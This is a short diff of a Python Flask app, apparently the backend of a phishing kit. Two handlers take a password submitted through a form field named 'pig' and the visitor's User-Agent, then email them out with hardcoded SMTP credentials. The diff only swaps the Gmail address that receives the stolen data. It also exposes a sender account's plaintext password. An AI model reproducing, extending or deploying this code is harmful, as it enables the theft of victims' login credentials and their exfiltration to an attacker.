@@ -160,7 +160,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "new@influencedigital.cloud"
         sender_emaill = "eissa"
-        receiver_email = "zeeskollectz@gmail.com"
+        receiver_email = "kdaenchu@gmail.com"
         password = "Odilli116!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -198,7 +198,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "new@influencedigital.cloud"
         sender_emaill = "eissa"
-        receiver_email = "zeeskollectz@gmail.com"
+        receiver_email = "kdaenchu@gmail.com"
         password = "Odilli116!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
